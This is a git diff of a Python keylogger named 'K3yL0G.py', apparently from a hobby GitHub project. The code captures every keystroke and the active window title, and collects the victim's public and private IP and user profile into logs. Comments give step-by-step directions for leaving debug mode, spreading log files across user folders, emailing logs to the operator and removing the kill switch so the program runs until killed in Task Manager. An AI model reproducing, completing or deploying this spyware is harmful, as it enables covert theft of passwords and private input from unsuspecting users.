@@ -1,3 +1,10 @@
+from pynput.keyboard import Key, Listener
+import win32gui
+import random
+import requests
+import socket
+import time
+import os
 """
 MIT License
 
@@ -32,19 +39,14 @@ types is stored in the logs.txt file, or emailed to the administer of 'K3yL0G.py
 # K3yL0G.py is initially setup to run in 'DEBUG' mode. Which outputs the keys pressed, to a console, and stores the data
 to a 'Logs.txt' file in the specified debug DIR on disk, rather than emailing the administer of this file. This is to help minimize 
 damage from script kiddies. While in Debug Mode 'K3yL0G.py' can be shut down with 'HOME' key.
-# I assume whoever is running this script possesses the knowledge to take it out of debug mode. Here is a quick run down:
+# I assume whoever is running this script possesses the knowledge to take it out of debug mode;
+If you are interested. Here is a quick run down on how that would work:
     # Under the write_file() function; Change dirList = [debug] >> dirList  = [one, two, three] 
     # Change the TO:/FROM: email vars to your own email. (Must be setup with google API) # Current WIP
     # Run send_logs() function >> __name__ == '__main__'  (Above the Listener) # Current WIP
     # OPTIONAL: Remove/modify the if statement under on_press() function that shuts down K3yL0G.py with 'HOME' key.
+    #### REMEMBER: To shutdown you will need to end the task in the Task Manager. ####
 '''
-from pynput.keyboard import Key, Listener
-import win32gui
-import random
-import requests
-import socket
-import time
-import os
 
 # Log Banner Info
 pubIP = requests.get('https://api.ipify.org').text  # Grabs Public IP from ipify API
@@ -56,12 +58,17 @@ datetime = time.ctime(time.time())  # Current Date/Time
 msg = f"[START OF LOGS]\n ~* Date/Time: {datetime}\n ~* User-Profile: {user}\n ~* Public IP: {pubIP}\n " \
       f"~* Private IP: {privIP}\n"
 
-# STORED DATA
+'''
+LOGGED DATA
+'''
+# Logged Info
 log_data = [msg]
 
+# Application Info
 oldApp = ''
 d_file = []
 
+# Writes to file every _ keys pressed.
 key_count = 0
 keys = []
 
@@ -116,7 +123,7 @@ def write_file():
     # one = os.path.expanduser('~') + '/Documents/'
     # two = os.path.expanduser('~') + '/Pictures/'
     # three = os.path.expanduser('~') + '/******/' - Add another DIR
-    debug = os.path.expanduser('~') + '/Documents/GitHub/Python/Random Projects/keyloggers/' # Change this 
+    debug = os.path.expanduser('~') + '/Documents/GitHub/Python/Random Projects/keyloggers/'  # Change this
 
     # List of directories to move temp stored log file between. (Only use when emailing logs)
     dirList = [debug]
@@ -140,7 +147,7 @@ def write_file():
     # print('Data Written to Logs.txt...') # Debugging
 
 
-# Shutdown Key - DEBUG ONLY
+# Shutdown Key == [HOME] - DEBUG ONLY!
 def on_release(key):
     if key == Key.home:
         return False
@@ -156,6 +163,7 @@ def send_logs():
     while True:
         if len(log_data) > 1:
             try:
+                # SEND EMAIL HERE - F*** YOU GOOGLE!
                 write_file()
                 os.remove(d_file[0])
                 del log_data[1:]
